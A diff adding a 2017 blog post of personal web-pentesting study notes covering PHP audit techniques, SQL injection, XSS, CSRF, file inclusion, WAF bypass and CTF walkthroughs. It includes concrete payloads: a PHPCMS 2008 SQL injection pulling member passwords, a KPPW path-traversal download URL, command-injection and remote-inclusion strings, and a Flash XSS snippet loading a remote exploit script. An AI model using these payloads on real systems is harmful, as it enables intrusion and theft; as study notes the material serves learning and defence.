@@ -1,0 +1,953 @@
+---
+layout:     post
+title:      "[杂乱笔记] My trip on Pentesting"
+date:       2017-09-08 21:50:00
+author:     "LiqueurTofu"
+header-img: "img/home-bg-art.jpg"
+catalog:    true
+tags:
+    - 杂乱笔记
+---
+
+<br>
+
+# Skills - PHP
+* 积极看 db & xdebug, 以及打印 php & mysql
+* 审计方法
+    - 把握大局
+        + __先标记，不要急于研究__
+        + 网站目录结构
+        + 入口文件
+            * `index.php`, `admin.php`
+                - 程序结构、运行流程、包含的配置/过滤文件、程序业务逻辑
+        + 配置文件
+            * 数据库相关信息
+            * 数据库编码 gbk 可能存在 __宽字节注入__
+            * 变量值用双引号可能存在 __双引号解析代码执行__
+        + 过滤功能
+            * 公共函数文件 和 安全过滤文件
+                - 替换 还是 正则 还是 indexof
+                - 有无 gpc
+                - 有无 addslashes
+    - 通读全文
+        + 根据入口文件进入各个功能进行审计
+    - 敏感函数回溯
+        + 误报率高
+        + Seay 源代码审计系统
+        + 分析敏感函数上下文，追踪参数源头，尝试可控参数变量
+    - __定向功能分析__
+        + 根据功能推测可能存在漏洞
+            * 程序初始安装
+            * 站点信息泄露
+            * 文件上传
+            * 文件管理
+            * 登陆认证
+            * 数据库备份恢复
+            * 找回密码
+            * 验证码
++ common vul
+    * 命令注入 - 敏感函数
+        - php 注入
+            + 命令注入
+                * system
+                * exec
+                * passthru
+                * shell_exec
+                * ``(与 shell_exec 功能相同)
+            + eval 注入
+            + 客户端脚本攻击 scripting insertion
+            + xss
+            + sqli
+            + 动态函数注入 dynamic variable evaluation
+            + 序列化注入 & 对象注入
+            + XXE
+    * 安装 - 特定功能定向
+        - 无验证任意重装覆盖
+        - `$_GET['step']` 跳过限制步骤
+        - 变量覆盖导致重装
+        - 判断 lock 后跳转无 exit 导致重装
+            + burp suite 抓包看响应可以看到不 exit 后面的 code
+        - 解析 `install.php.bak` 漏洞
+        - 注入新写文件
+            + 比如 sql 操作建一个新db， 后面又有使用这个 $dbname 新创一个 php
+                * `-- -` 注释使 sql 能执行，然后插 php 语句
+                    - 注意构造闭合和注释
+                        + `$dbname = "exp;-- -";phpinfo();//";`
+                    - sql 注释
+                        + 单行注释
+                            ```
+                            --xxx
+                            ```
+                        + 多行注释
+                            ```
+                            /*xxx*/
+                            ```
+        - ...
+    * SQL 数字型注入
+    * XSS 后台敏感操作
+    * 文件包含 - include 相关函数 `$path.$filename.$ext`
+        - 小技巧
+            + php 处理上传文件一般搜索 `$_FILE`
+            + 一般上传文件还会随机字符串(比如时间戳)不让知道传完文件名, 但是又很可能把文件名放到 session 和 db 中, 如 `$_SESSION['avatar']` 来自己读文件
+                * 这时可能存在 vul, 比如使用 `echo file_get_contents($_SESSION['avatar'])`
+                    - LFI
+                    - SSRF
+                        + 看能不能 get baidu 来测试
+                * 时间戳也可以爆破
+                    - headers 会有一个 date string
+                        + php `strtotime()`
+                * 在 db 中 `UPDATE users SET user_avatar = '$avatar' where userid = '$_SESSION['user_id']'`
+                    - `set` 可以多次, 取最后一次
+                        + `UPDATE users SET user_avatar = '1', user_avatar = '2' where userid = '1'`
+                            * `UPDATE users SET user_avatar = '1', user_avatar = '2' where username = 'test'#.png`
+                                - `UPDATE users SET user_avatar = '1', user_avatar = '../sys/config.php' where username = 'test'#.png`
+                                    + 一般这种带路径带斜杠会被拦
+                                        * `../sys/config.php` 转 hexdecimal bypass
+        - 分类
+            + 本地包含 LFI
+                * 无限制，包含任意文件
+                * 限制后缀 `*.php`
+                    - 利用方式
+                        + 伪协议 `zip://` & `phar://path/archive/fileinarchive` 绕过后缀
+                            * 比如限定 `.inc` 后缀
+                                - 那就 `.php` 改名 `.inc` 然后打包 `.zip` 如果只能上传图片就 再改名 `.png` 等
+                            * 限制路径的话也不能用伪协议包含
+                        + 截断大法截断后缀
+                            * php 高版本已修复
+                    - 修复
+                        + 白名单
+                * 不限制后缀, 限制路径, 可以考虑包含
+                    - 上传文件
+                    - 日志 & 环境变量
+                    - session 文件
+                    - 结合 phpinfo 包含临时文件
+                * 读取任意文件
+                    - `?file=php://filter/convert.base64-encode/resource=index.php`
+                        + 话说一些加密的 webshell 可以用 xdebug 跟踪看码得到密码，而且一般有 decode 关键字
+            + 远程包含 RFI - `allow_url_include` 默认为 `Off`
+                * `allow_url_include = Off`
+                    - `allow_url_fopen = Off`
+                        + 包含共享文件
+                            * `?file=\\192.168.1.1\share\xxx.php`
+                * `allow_url_include = On`
+                    - `allow_url_fopen = Off`
+                        + 代码执行
+                            * `?file=php://input`
+                        + 利用 dataURIs
+                            * `?file=data://text/plain,base64,SSBsb3ZlIFBIUAo=`
+                                - `I love PHP`
+                    - `allow_url_fopen = On`
+                        + 远程代码执行
+                            * `?file=[http|https|ftp]://xxx/file`
+                            * `?file=[http|https|ftp]://xxx/file.txt[?|%23]`
+                        + 利用 XSS 执行任意代码
+                            * `?file=http://xxx/xss.php?xss=phpcode`
+    * 文件操作
+        - 任意文件删除
+            + 删除 lock
+        - 任意文件复制
+            + jpg2php
+            + php2txt
+        - 任意文件下载
+        - 任意文件读取
+            + 读取配置/系统重要信息
+            + SSRF
+                * 漫游内网
+        - 写入任意文件
+    * 越权
+        - 未判断 userid 是当前用户的还是其他用户的
+            + 水平越权
+            + 垂直越权
+    * 登陆密码爆破
+        - 撞库
+        - 验证码
+            + 绕过
+                * session 不更新
+                * 绕过 session
+                    - `@$_POST['catpcha'] != $_SESSION['catpcha']`
+                        + 那么如果都是空
+                            * burp suite 删 PHPSSID 和 post
+                                - 然后爆破
+                                    + 看 response 长度判断是否成功
+            + 自动识别验证码
+    * 截断注入
+        + 双条件查询情况下转义一个单引号，这时要考虑截断或字符集转换/反转义
+            * 第一个条件去闭合单引号，第二个条件即是 Payload
+            * 第一次是前提，第二次根据第一次的前提去注入
+        + 
+            ```
+            INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('{$_SESSION['username']}','$clean_message',now())`
+            ```
+            * 
+                ```
+                INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxx\','payload',now())
+                ```
+                - 
+                    ```
+                    INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('xxx\',',(do sth),1);#',now())
+                    ```
+                    + 弄掉了 payload 左侧的单引号，方便 payload 干活
+                - `\` 转义掉了 `'` 使得实际使用 payload 左侧单引号闭合 username 的引号
+                - 就算`\\` 被转义，打印出来的转义， __数据库中的不一定被转义__
+                    + INSERT 语句确实带转义,成 `\\`, 但进入数据库插完后成`\`
+                        * 所以是二次注入嘛
+* config
+    - `short_open_tag = On` 
+        + `<? ?>` and `<?php ?>`
+        + `<?=` and `<? echo`
+            * might be useful in __bypassing__
+    - `disable_classes = `
+    - `disable_functions = `
+        + `opendir`
+        + `readdir`
+        + `scandir`
+        + `fopen`
+        + `unlink`
+    - `file_uploads = on`
+    - `upload_max_files = 8M`
+    - `upload_tmp_dir = `
+    - `open_basedir = `
+        + [open-basedir](http://php.net/manual/zh/ini.core.php#ini.open-basedir)
+        + separated by `:` on Linux
+        + separated by `;` on Win
+    - `display_error`
+    - `error_reporting`
+    - `magic_quotes_gpc`
+        + get/post/cookie
+        + removed because of efficiency
+    - `allow_url_fopen`
+        + default on
+    - `allow_url_include`
+        + default off
+        + `include`
+        + `include_once`
+        + `require`
+        + `require_once`
+        + `include` vs `require`
+            * `require` will produce a fatal error (E_COMPILE_ERROR) and stop the script
+            * `include` will only produce a warning (E_WARNING) and the script will continue
+* some dangerous func
+    - code exec
+        + `eval()`
+        + `assert()`
+        + `preg_replace()`
+            * `/e`
+        + `create_function()`
+            * 
+            ```
+            $newfunc = create_function('$v', 'return system($v);');
+            ...
+            $newfunc('whoami');
+            ```
+            * 
+            ```
+            $afunc = 'sys'.'tem';
+            $afunc('whoami');
+            ```
+        + `call_user_func()`
+        + `call_user_func_array()`
+    - inclusion
+        + `include()`
+        + `include_once()`
+        + `require()`
+        + `require_once()`
+    - command exec
+        + `exec()`
+        + `passthru()`
+        + `proc_open()`
+        + `shell_exec()`
+        + `system()`
+            * `system('ping -c 3'.$target)` ?
+                - truncation. `target = a | whoami`
+        + `popen()`
+    - file manipulation
+        + `copy`
+        + `file_get_contents`
+        + `file_put_contents`
+        + `file`
+        + `fopen`
+        + `move_uploaded_file`
+        + `readfile`
+        + `rename`
+        + `rmdir`
+        + `unlink` & `delete`
+            * delete `.lock`
+    - info leak
+        + `phpinfo()`
+    - Soft Link (Symbolic link)
+        + symlink`()`
+        + readlink`()`
+    - env
+        + `getenv()`
+        + `putenv()`
+    - load extension
+        + `dl()`
+            * [dl](http://php.net/manual/zh/function.dl.php)
+    - conf
+        + `ini_get()`
+        + `ini_set()`
+        + `ini_alter)`
+        + `ini_restore()`
+    - num determination
+        + `is_numeric()`
+            * if only using `is_numeric()` without converting by using `intval()`, there can be __SQL 二次注入__ by inserting __hexadecimal__ string into DB
+    - array related
+        + `in_array($needle, $haystack [, $strict = FALSE])`
+            * search `$needle` in `$haystack`
+            * auto cast before comparison
+                - 
+                ```
+                $a = `1abc`
+                in_array($a, array(1,2,3)) //true
+                ```
+    - var overwrite 变量覆盖
+        + `parse_str()`
+        + `extract()`
+        + `mb_parse_str()`
+        + `import_request_variables()`
+    - list dir
+        + `glob()`
+    - sth else
+        + `get_defined_vars()`
+        + `get_defined_constants()`
+        + `get_defined_functions()`
+        + `get_included_files()`
+
+# Skills - SQL injection
+* 分类
+    - 数字型注入
+        + 一般不用考虑引号问题
+    - 字符型注入
+        + 一般都带有单引号，需要闭合单引号
+            * 双条件查询情况下转义一个单引号，这时要考虑截断
+    - [二次注入](https://aerfa1111.gitbooks.io/p-h-p-a-u-d-i-t/thirteen/13-1.html)
+    - 宽字节注入
+        + GBK 字符集
+        + 转换字符集
+    - union select
+    - insert update delete
+    - server 注入
+    - file 注入
+    - 变量覆盖导致注入
+    - 未初始化导致注入
+    - 数组导致注入
+        + key 不过滤或低版本不转义
+        + offset 特性
+    - like 特性
+        + `_` 代表单个任意字符
+    - bypass 过滤函数
+        + stripslashes 特性
+        + 长度限制截断
+        + 替换导致注入
+            * 比如 "select" 被替换成"sqlwaf", "||" 被替换成 空"", 那么就可以用 `sel||ect` bypass
+* 技巧
+    - `/**/` 过空格转义
+    - 有的浏览器会补 `"`
+        + 如果 `""` 被转义可以试一下 `src = http://www.xxx.com/yyy.js`
+    - `json_decode()` 具备绕过全局转义以及gpc的特点，也就是会吞并反斜杠
+        + [ECShop前台无限制SQL注入](https://xianzhi.aliyun.com/forum/topic/1865/)
+    - 猜有多少个字段
+        + orderby
+        + 大概弄七八个然后慢慢删减
+    - 搞清什么时候用直接结果什么时候用报错
+    - [SQL 注入之骚姿势小记](http://mp.weixin.qq.com/s/ORsciwsBGQJhFdKqceprSw?cmtbpage=1)
+        + `IN` 之骚
+            * IN操作符允许我们在WHERE子句中规定多个值
+                - `select * from users where id in (1,2)` 
+            * 过滤等号和过滤 `like` 的 sql 注入
+                - 爆破
+        + `BETWEEN` 之骚
+            * 需要 `and`, 有点鸡肋
+            * `select * from users where username between 'aa' and 'ae'`
+            * `select * from users where username between 0x6161 and 0x6165`
+        + `ORDERBY` 之骚
+            * 利用条件
+                - web 端要有对应注入出数据同一行的其他字段的回显(想注入出 password, web 端要有 username/id/...的回显)
+                - 如 web 页面有个 username 回显
+                    + `select * from users where id=2 union select 1,'test','ab',4 order by 3`
+                        * ![order-by](/img\pen\order-by.webp)
+                        * 通过 `order by 3` 对查询到的第三个字段password进行排序，改变select的第三字段位置的内容，如：aa时候web页面显示username为test，ab时候还是显示为test，ac时候变成了abcde，就证明password前两个字符为ab，然后依次再往后猜测
+        + 列名构造之骚
+            * 列名被waf
+            * `select 1,2,3,4 union select * from users`
+        + 临时变量之骚
+            * 用来进行 `orderby` 表的列数判断
+        + 运算符之骚
+            * pre-knowledge
+                - 1 for true, 0 for false
+            * `where username=''^0` 
+                - 首字母非数字的会被查询出来
+            * `where username=''^1` 
+                - 首字母是 1 的会被查询出来
+            * `select ''^(ascii(substr((select version()),1,1))>1)^1;`
+            * `select ''^(ascii(substr((select version()),1,1))>1)^1;`
+        + 大/小于号之骚
+            * `select * from test where name > 'h'`
+            * 爆破
+* cases
+    - [PHPCMS2008 SQL注入漏洞](http://byd.dropsec.xyz/2016/09/22/PHPCMS2008%E5%B9%BF%E5%91%8A%E6%A8%A1%E6%9D%BFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)
+        + `/ads/include/ads_place.class.php` 的 `show` 方法中
+            * `$this->referrer` 直接将 HTTP 请求头中的 referer 字段插入到数据库中，没有做任何过滤措施。
+        + 回溯找用户可访问的页面
+            * `/data/js.php`  一层层 require 最终调用了 `show` 
+        + payload
+            * 
+            ```
+            referer=1', (SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0')#
+            ```
+                - __group by 报错__
+                    + 将盲注转换成显示注入
+                    + 数据表中需要>=3条数据才会报错
+                    + [Mysql报错注入原理分析(count()、rand()、group by)](https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect)
+                    + [根据mysql报错进行回显注入的原理是什么？](https://www.zhihu.com/question/21031129/answer/95063409)
+                    + 网上最常见的语句
+                        * `select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;`
+                - 报错注入
+                    + [【SQL注入】mysql十一种报错注入方式](https://www.msfcode.com/2016/10/11/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91mysql%E5%8D%81%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/)
+                    + [SQL报错注入总结](http://whc.dropsec.xyz/2017/04/16/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/)
+                    + [【SQL注入】报错注入姿势总结](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/)
+                - 盲注
+                    + [盲注的讲解](https://www.cnblogs.com/lcamry/p/5763129.html)
+                    + [详解SQL盲注测试高级技巧](http://www.freebuf.com/articles/web/30841.html)
+                    + [sql盲注学习笔记](https://www.jianshu.com/p/65f05e7cc957)
+    - [BlueCMS 1.6 SQL 注入漏洞](http://blog.leanote.com/post/fourele/000013)
+        + 程序在使用 `getip()` 函数获取客户端 ip 时没有严格过滤数据
+        + 虽然是盲注，但是因为 insert 可以一次插多个数据，把 select 注入出来的数据 insert 到 comment content，刚好网页又要显示 comment content
+    - PHPYun XML 注入漏洞 (3.1 build 14061)
+        + analysis
+            * like [this](https://www.secpulse.com/archives/42463.html)
+            * ichunqiu-KnownSec
+                - ![phpyun-14061-xml-sqli-1](/img\pen\phpyun-14061-xml-sqli-1.png)
+                - ![phpyun-14061-xml-sqli-2](/img\pen\phpyun-14061-xml-sqli-2.png)
+                - ![phpyun-14061-xml-sqli-3](/img\pen\phpyun-14061-xml-sqli-3.png)
+                - ![phpyun-14061-xml-sqli-4](/img\pen\phpyun-14061-xml-sqli-4.png)
+                - `index.php` 会有打印，查看页面源码中的 xml 数据即可看到 sqli 回显
+        + XML 注入漏洞字段 HTTP_RAW_POST_DATA 在 POST 发送不可识别的 MIME 类型数据情况下会生成
+            * 绕过 WAF
+        + 需要如何修改 HTTP 请求才能触发 XML 注入漏洞？
+            * Content-Type:text/xml;
+                - php 默认识别类型是 `application/x-www-form-urlencoded`
+        + 在 xml 中， `CDATA` 区段的文本会被xml解析器忽略
+        + `union`
+            * [SQL Injection Using UNION](http://www.sqlinjection.net/union/)
+                - UNION-based attacks allow the tester to easily extract information from the database. Because the UNION operator can only be used if both queries have the exact same structure, the attacker must craft a SELECT statement similar to the original query.
+                    + need to find
+                        * Table Name Error
+                            - can use `union` as well, don't need to determine Number of Columns at the moment
+                        * Number of Columns
+                        * Data Types
+                    + An always false condition was added to the WHERE clause of the original query before the UNION operator. It is a common practice when extracting data. By doing so, the attacker makes sure that all the lines returned come from the injected query.
+* protection
+    - 过滤/转义
+        + escape
+    - Prepared Statements (with Parameterized Queries)
+        + 参数化查询
+    - Stored Procedures
+    - WAF
+
+# Skills - XSS
+* 反射型
+    - 怎么用
+        + 欺骗点击
+            * 短 url
+        + 结合 CSRF
+    - 实例
+        + DedeCMS 5.7 反射型XSS漏洞
+            * `ExternalInterface.call(func_name[, param])` 相当于 js `func([param])`
+                - 最终
+                    ```
+                    try {
+                        __flash__toXML(func_name([param]))
+                    }catch(e) {"<undefined/>";}
+                    ```
+            * 反编译 swf 可知
+                - `ExternalInterface.call` 参数未过滤，可控
+                    + 如果传的不是函数名而是函数就会调用函数
+                    + 调用可被控的 `this.flashReady.Callback`
+                        * 由 `this.movieName` 拼接而成
+                            - `this.movieName` 可控
+                    + payload
+                        `"])}catch(e){alert(1)};//`
+                    + 导致
+                        ```
+                        try {
+                            __flash__toXML(SWFUpload.instances[""])
+                        }catch(e){
+                            alert(1)
+                        };
+                        //"].flashReady(参数1));}catch(e) {"<undefined/>";}
+                        ```
+* 存储型
+    - TurboMail 存储型XSS漏洞
+        + 邮件内容编辑器对 html 标签未作转义
+            * 草稿箱中的邮件内容未经转义直接 json 输出
+                - 邮件内容读取模块未对 html 转义和过滤 javascript 函数
+                - 可以直接插 js/swf
+                    + js way
+                        * 就是直接插
+                    + [swf way](http://0day5.com/archives/1732/)
+                        * insert swf 
+                            ```
+                            <embed allowscriptaccess="always" width="0%" height="0%" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shock-wave-flash" src="http://127.0.0.1/xss.swf"></embed>
+                            ```
+                        * swf content
+                            - `getURL("javascript:alert(document.cookie)");`
+                            - or 
+                                ```
+                                import flash.external.ExternalInterface;
+
+                                ExternalInterface.call("eval","d=document;e=d.createElement('script');e.src='http://127.0.0.1/eXploit.js';d.body.appendChild(e);");//使用ExternalInterface.call()函数加载本地脚本文件，通过修改本地脚本文件内容我们可以进行盗取用户信息、用户邮件、钓鱼，编写蠕虫等操作。
+                                ```
+* DOM 型
+    - Discuz 全版本存储型 DOM XSS
+        + [Wooyun](http://cb.drops.wiki/bugs/wooyun-2015-099979.html)
+        + [analysis](http://rickgray.me/discuz-all-version-stored-xss-analysis)
+        + BBCode
+        + 使用了原生的 `document.getElementById()` 函数来获取页面中的对应对象
+            * 由于 JS 原生函数的原因，被服务器后端转义的引号会被重新是渲染回引号
+
+# Skills - CSRF
+* ichunqiu
+    - ![csrf-1](/img\pen\csrf-1.png)
+    - ![csrf-2](/img\pen\csrf-2.png)
+* XSS vs CSRF
+    - xss 利用站点内信任用户
+    - CSRF 利用伪装来自受信任用户的请求来利用受信任的站点
+* combination
+    - csrf + sqli
+    - csrf + command exec
+    - csrf + xss
+* [D-link DIR-600 路由器 CSRF漏洞](http://www.nxadmin.com/web/1237.html)
+    - 没有验证请求的来源
+    - 自己构造一个页面让用户访问然后对路由器发起一个请求
+    - ![dlink-dir-600-csrf](/img\pen\dlink-dir-600-csrf.png)
+* defense
+    - 关了再开？不开多标签？
+        + osx 为了加速 点 x 并完全退出
+    - 检查 http referer 是否同域
+    - 限制 session cookie 生命周期
+    - 使用验证码
+    - 在表单的隐藏表单项中使用一次性 token
+        + 原理: 无法通过 ajax 等方式获取外域页面中的 token 值
+
+# Skills - 命令执行漏洞
+* [Bash 4.3 远程命令执行漏洞](http://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/)
+    - http://www.freebuf.com/vuls/44994.html
+    - http://blog.sina.com.cn/s/blog_6b347b2a0102v3nc.html
+    - http://www.antiy.com/response/CVE-2014-6271.html
+    - 补丁白打，有人绕过
+        + http://www.freebuf.com/news/44805.html
+        + https://www.seebug.org/vuldb/ssvid-88877
+* PHPCMS 2008 命令执行漏洞
+    - http://lyx.dropsec.xyz/2016/06/07/phpcms_2008%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/
+    - http://www.cnblogs.com/sqyysec/p/7049953.html
+    - 漏洞分析
+        + 传参，被放到数据库中
+        + select 然后 extract (array 转 变量)
+        + 然后 string2array 中有 eval
+    - 利用
+        + 要构造不存在 userid?
+        + 结合 CHR() 来解决 编码问题 (比如空格)
+
+# Skills - 任意文件下载, Arbitrary File Download
+* KPPW 2.2 任意文件下载漏洞
+    - analysis
+        + `/lib/helper/keke_file_class.php` 仅禁止下载 php 后缀文件
+            * php
+                - case-sensitive, 大小写敏感
+            * windows osx
+                - case-insensitive
+        + 路径必须存在 `data/uploads/`
+    - payload
+        ```
+        http://host/index.php?do=ajax&view=file&ajax=download&file_name=xxx.txt&file_path=data/uploads/../../config/config_ucenter.phP
+        ```
+
+# Skills - 文件上传漏洞
+    * WeBid 1.1.1 文件上传漏洞
+
+# Skills - 代码执行漏洞
+* CmsEasy 5.5 代码执行漏洞
+    - post `catid`
+    - `preg_replace()`
+        + reg replace then `eval()`
+        + 自 PHP 5.5.0 起废弃
+
+# Skills - 逻辑漏洞
+* 登录绕过
+    - [AspCms 2.2.9 登录绕过漏洞](https://www.seebug.org/vuldb/ssvid-62356)
+        + modify cookie
+        + defense
+            * use session instead of cookie
+    - [AKCMS 6.0 登录绕过漏洞](https://www.seebug.org/vuldb/ssvid-89219)
+        + `\**\` 替代空格 绕过正则
+        + __GBK 宽字符注入__
+            * need to construct one __greater than ascii(128)__
+                - `%c1`
+                - `%bf`
+            * defense
+                - `mysql_set_charset("gbk")` instead of `mysql_query("set name gbk")`
+                - `mysql_real_escape_string()` instead of `addslashes()`
+
+# Skills - 文件包含漏洞, File Inclusion
+* [DedeCMS 5.7 远程文件包含漏洞](https://www.seebug.org/vuldb/ssvid-89362)
+    - index.php.bak, apache 后缀解析, bak 无对应，溯到 php
+    - `step=11`
+    - 可以利用变量覆盖伪造 `$rmurl` 地址，使之无内容，让 `$install_demo_name` 目标为 `config_update.php`，因为 `$updateHost` 变量保存在其文件中，必须清空 `config_update.php `的内容，我们才可以利用变量覆盖来控制 `$updateHost` 变量的值，然后获取我们构造在远程服务器的文件内容。
+        + 第一步，利用变量覆盖使得$s_lang变量的值在拼接好的 `$rmurl` 变量内容所指向的资源不存在，`$install_demo_name` 值为 `../data/admin/config_update.php`，然后通过 `write($fp,$sql_content)` 写入空内容到 `config_update.php` 文件中。
+        + 第二步，在自己的远程服务器上构建一个包含 shell 代码的文件，利用变量覆盖构造 `$updateHost` 为自己服务器的地址，`$install_demo_name` 为将要写入的 shell 文件地址，`dedecms/demodata.${s_lang}.txt` 为自己服务器上构造的文件路径。
+        + 成功后即可写入 shell 到指定的文件中。
+
+# Skills - SSRF, Server-Side Request Forgery, 服务器端请求伪造
+* [SSRF攻击实例解析](http://www.freebuf.com/articles/web/20407.html)
+    - 对外网、服务器所在内网、本地进行端口扫描
+    - 攻击运行在内网或本地的应用程序（比如溢出）
+    - 通过访问默认文件对内网web应用进行指纹识别
+    - 攻击内外网的web应用
+        + 主要是使用get参数就可以实现的攻击（比如struts2，sqli等）
+    - 利用file协议读取本地文件等
+
+# Skills - Bypass WAF
+* [深入了解SQL注入绕过waf和过滤机制](http://wps2015.org/drops/drops/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E5%92%8C%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6.html)
+* [我的WafBypass之道（SQL注入篇](https://paper.seebug.org/218/)
+* [绕过WAF继续SQL注入常用方法](http://www.freebuf.com/articles/web/36683.html)
+* [WAF的SQL注入绕过手段和防御技术](http://blog.51cto.com/schina/1693830)
+
+# Wargames/CTFs
++ [umisc/webctf](https://github.com/ChrisLinn/webctf)
+    * set cookies
+    * devtool
+    * `robots.txt` can tell sth
+    * flask/ruby ... don't enable debugging
+        - `/console/`
+    * PIN for flask
++ [CYBERSECURITY CHALLENGE AUSTRALIA 2014 IN A BOX](https://www.cyberchallenge.com.au/)
+    * NAT for VM
+    * Setting a Static IP:
+        - /etc/network/interfaces
+    * `ncat <STATIC_IP> <PORT>`
+    * Burp Suite
+        - can edit cookies
+            + better than ZAP?
+        - can edit request/response
+            + but cannot set breakpoint?
+                * not convenient as ZAP if so
++ [try2hack.nl](http://try2hack.nl/)
+    * solutions
+        - http://su2.info/doc/try2hack_solutions.php
+        - https://github.com/dsolstad/walkthrough-try2hack.nl
+        - https://code2relax.wordpress.com/category/hall-of-challenges/try2hack-nl/
+    * walkthrough
+        - [level 1](http://www.try2hack.nl/levels/)
+            + view source
+                * `h4x0r`
+        - [level 2](http://www.try2hack.nl/levels/level2-xfdgnh.xhtml)
+            + right-click on mouse disabled
+            + `ctrl+u` or `F12` or download
+            + `level2.swf`
+            + solutions
+                * `view-source:http://try2hack.nl/levels/level2.swf` and see the username and password among the mess.
+                * commandline tool `strings`
+                * Flash Decoder: [Flare](http://www.nowrap.de/download/flare06setup.exe)
+                    * 
+                    ```
+                    movie 'C:\Downloads\level2.swf' {
+                    // flash 5, total frames: 1, frame rate: 12 fps, 400x300 px
+                     
+                      button 9 {
+                     
+                        on (release) {
+                          if (txtUsername == 'try2hack' and txtPassword == 'irtehh4x0r!') {
+                            getURL('level3-.xhtml', '_self');
+                          }
+                        }
+                      }
+                    }
+                    ```
+        - [level 3](http://www.try2hack.nl/levels/level3-.xhtml)
+            + asks for password directly
+            + fail if don't enter directly 
+            + dialog blocks viewing source
+                * `wget` or [Web Sniffer](http://web-sniffer.net/)
+                * 
+                ```
+                <script type="text/javascript" src="JavaScript"></script>
+                <script type="text/javascript">
+                  <!--
+                  pwd = prompt("Please enter the password for level 3:","");
+                  if (pwd==PASSWORD){
+                    alert("Allright!\nEntering Level 4 ...");
+                    location.href = CORRECTSITE;
+                  }
+                  else {
+                    alert("WRONG!\nBack to disneyland !!!");
+                    location.href = WRONGSITE;
+                  }
+                  PASSWORD="AbCdE";
+                  CORRECTSITE="level4-sfvfxc.xhtml";
+                  WRONGSITE="http://www.disney.com";
+                  //-->
+                </script>
+                ```
+                * try with `AbCdE` but fail
+                * observe the first `<script type="text/javascript" src="JavaScript"></script>`
+                * download it
+                * the real values for "PASSWORD","CORRECTSITE" and "WRONGSITE". They're set before the fake values below
+                    - try2hackrawks
+        - [level 4](http://www.try2hack.nl/levels/level4-kdnvxs.xhtml)
+            + Java applet
+            + requires IE
+            + http://www.try2hack.nl/levels/PasswdLevel4.class
+            + Java Decomplier
+                * JD-GUI
+                * javap
+                    - from JDK
+            + infile()
+                * "level4"
+                * download `http://www.try2hack.nl/levels/level4`
+                    * hex
+                        - [WebHex](http://en.webhex.net/)
+                            - an online hex-viewer
+        + [level 5](http://www.try2hack.nl/levels/level5-fdvbdf.xhtml)
+            * winhex
+                - vbrun300.dll
+            * [Dodi VB decompiler](http://vbdis4.angelfire.com)
+            * https://github.com/dsolstad/walkthrough-try2hack.nl/blob/master/level05.md
+* Binary
+    - books to read
+        + Windows PE 权威指南
+        + windows 核心编程
+        + reverse-engineering-for-beginners, 逆向工程权威指南
+    - practices
+        + [（160个CrackMe）做完这160个练习题，90%的软件你就能搞定了](https://bbs.ichunqiu.com/thread-29740-1-1.html)
+
+
+
+# Tools
+* Burp suite
+    - 可以根据 Content-Length 来确定是否存在注入
+        + ctrl + r
+            * 重放
+        + ctrl + i
+            * Intruder 爆破
+                - positions
+                    + add
+                - payloads
+                    + payload options
+                        * 字典
+                - options
+                    + request engine
+                        * multi-thread
++ OwaspZAP
+    - better than `webscarab`
+        + `webscarab` easy to crash, and doesn't work with https by default
+    - can edit request and response
+        + setting breakpoints properly is important
+* charlesproxy
+    - [微信跳一跳 可以直接更改分数， POST 请求没有校验…](https://www.v2ex.com/t/419056)
+        + support HTTPS cert
+
+# Miscellaneous
++ 漏洞类型
+    * 注入类
+        - SQL
+        - XSS
+        - [XXE](https://security.tencent.com/index.php/blog/msg/69)
+        - 命令执行、命令注入
+        - 文件上传、文件下载
+    * 信息泄露类
+        - 源码泄露
+        - 敏感信息接口
+        - 员工资料泄露
+        - 服务器信息泄露
+    * 逻辑类
+        - 权限绕过
+        - 条件竞争
+            + 利用多个进程访问同一资源时产生的时间或者序列的冲突来对系统进行攻击
+            + 现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。
+        - 数据篡改
++ 内网
+    * 保留地址
+        - `10.x.x.x` 
+        - `172.16.x.x` ~ `172.31.x.x` 
+        - `192.168.x.x` 
+    * NAT 协议
+        - 网络地址转换
+        - 通过一个公共的网关访问 Internet
++ 花生壳
+    * shsonghao.gicp.net
+        - 103.44.145.245
+            + [http://dns.aizhan.com](http://dns.aizhan.com)
+                * ip 反查域名
+                    - amourz.gicp.net
+                    - yl228.imwork.net
++ 扫描 windows 和 linux 系统时收到的 TTL (Time To Live) 分别是
+    * 128、64
++ 提权
+    * `Serv-U` 提权
+    * `MYSQL` 提权
+        - Mysql 启动项提权
+        - 属于利用数据库提权
+    * `MOF` 提权
+        - 属于利用数据库提权
+    * `UDF` 提权
+        - 属于利用数据库提权
+    * `mimikatz` 提权
+    * `Gftp` 提权
+    * 输入法提权
+    * `FCKeditor` 拿 shell
++ FLASH 与宿主界面 JavaScript 通信的接口
+    * `ExternalInterface.call` 
++ HTTP header
+    * `referer`
+    * `X-Forwarded-For` 
